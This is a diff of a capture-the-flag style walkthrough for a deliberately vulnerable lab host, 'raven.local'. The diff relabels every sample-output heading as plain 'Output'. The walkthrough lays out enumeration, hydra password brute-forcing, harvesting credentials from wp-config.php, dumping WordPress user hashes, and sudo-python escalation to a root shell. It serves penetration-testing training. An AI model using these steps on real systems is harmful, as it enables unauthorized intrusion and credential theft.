@@ -16,7 +16,7 @@ Before scanning, confirm that the attacker and target virtual machines are attac
 sudo netdiscover -r 172.16.250.0/24
 ```
 
-Example output:
+**Output:**
 
 ```text
 Currently scanning: 172.16.250.0/24
@@ -33,7 +33,7 @@ echo '172.16.250.3 raven.local' | sudo tee -a /etc/hosts
 getent hosts raven.local
 ```
 
-Example output:
+**Output:**
 
 ```text
 172.16.250.3   raven.local
@@ -49,7 +49,7 @@ Start with a focused TCP scan:
 nmap -sV -sC -p- 172.16.250.3 -oN nmap-raven.txt
 ```
 
-Representative output:
+**Output:**
 
 ```text
 PORT    STATE SERVICE VERSION
@@ -72,7 +72,7 @@ Request the home page and inspect its headers:
 curl -i http://raven.local/
 ```
 
-Example output:
+**Output:**
 
 ```text
 HTTP/1.1 200 OK
@@ -90,7 +90,7 @@ Inspect common directories with a wordlist:
 gobuster dir -u http://raven.local/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
 ```
 
-Representative output:
+**Output:**
 
 ```text
 /status:           200
@@ -106,7 +106,7 @@ You can also perform a basic web-server review:
 nikto -h http://raven.local/
 ```
 
-Example output:
+**Output:**
 
 ```text
 + Server: Apache/2.4.10 (Debian)
@@ -126,7 +126,7 @@ curl -s http://raven.local/ > index.html
 grep -inE 'flag|comment|todo|hidden' index.html
 ```
 
-Example output:
+**Output:**
 
 ```text
 87:<!-- Training flag: FLAG{example_source_review} -->
@@ -142,7 +142,7 @@ If a WordPress installation appears under `/wordpress`, inspect it with a scanne
 wpscan --url http://raven.local/wordpress/ --enumerate u,vt --plugins-detection passive
 ```
 
-Representative output:
+**Output:**
 
 ```text
 [i] WordPress version detected: 4.x
@@ -177,7 +177,7 @@ hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form \
 -t 4 -f -V
 ```
 
-Representative output:
+**Output:**
 
 ```text
 [80][http-post-form] host: raven.local   login: steven   password: training-password
@@ -194,7 +194,7 @@ If a lab account is supplied or discovered through an authorized exercise, test 
 ssh michael@raven.local
 ```
 
-Representative output:
+**Output:**
 
 ```text
 michael@raven.local's password:
@@ -212,7 +212,7 @@ hostname
 pwd
 ```
 
-Example output:
+**Output:**
 
 ```text
 uid=1001(michael) gid=1001(michael) groups=1001(michael)
@@ -232,7 +232,7 @@ ls -la /var/mail
 cat /var/mail/michael
 ```
 
-Representative output:
+**Output:**
 
 ```text
 /var/mail
@@ -251,7 +251,7 @@ find /var/www -maxdepth 3 -type f -printf '%M %u %g %p
 ' 2>/dev/null
 ```
 
-Representative output:
+**Output:**
 
 ```text
 -rw-r--r-- www-data www-data /var/www/html/index.php
@@ -269,7 +269,7 @@ A configuration file may contain credentials in plaintext:
 sed -n '1,160p' /var/www/html/wordpress/wp-config.php
 ```
 
-Representative output:
+**Output:**
 
 ```text
 define('DB_NAME', 'wordpress');
@@ -286,7 +286,7 @@ A safer way to document the finding is to record only the presence and location 
 stat -c '%A %U:%G %n' /var/www/html/wordpress/wp-config.php
 ```
 
-Example output:
+**Output:**
 
 ```text
 -rw-r--r-- www-data:www-data /var/www/html/wordpress/wp-config.php
@@ -311,7 +311,7 @@ SHOW TABLES;
 SELECT ID, user_login, user_pass FROM wp_users;
 ```
 
-Representative output:
+**Output:**
 
 ```text
 +--------------------+
@@ -348,7 +348,7 @@ mysql -u root -p -D wordpress -e \
 cat wordpress-users.txt
 ```
 
-Example output:
+**Output:**
 
 ```text
 ID  user_login
@@ -366,13 +366,13 @@ For each authorized shell account, inspect permitted `sudo` commands:
 sudo -l
 ```
 
-Representative output for a restricted account:
+**Output (restricted account):**
 
 ```text
 User michael may not run sudo on raven.
 ```
 
-Representative output for a misconfigured account:
+**Output (misconfigured account):**
 
 ```text
 User steven may run the following commands on raven:
@@ -389,7 +389,7 @@ Only inside the intentionally vulnerable lab, the permitted interpreter can be u
 sudo /usr/bin/python -c 'import os; print(os.geteuid()); print(os.getuid())'
 ```
 
-Example output:
+**Output:**
 
 ```text
 0
@@ -404,7 +404,7 @@ Some training environments demonstrate an interactive shell using a pseudo-termi
 sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Example output:
+**Output:**
 
 ```text
 root@raven:/home/steven# id
@@ -421,7 +421,7 @@ Once root access has been demonstrated in the lab, search only the challenge dir
 find /root /home /var/www -maxdepth 3 -type f -iname '*flag*' -print 2>/dev/null
 ```
 
-Representative output:
+**Output:**
 
 ```text
 /root/flag4.txt
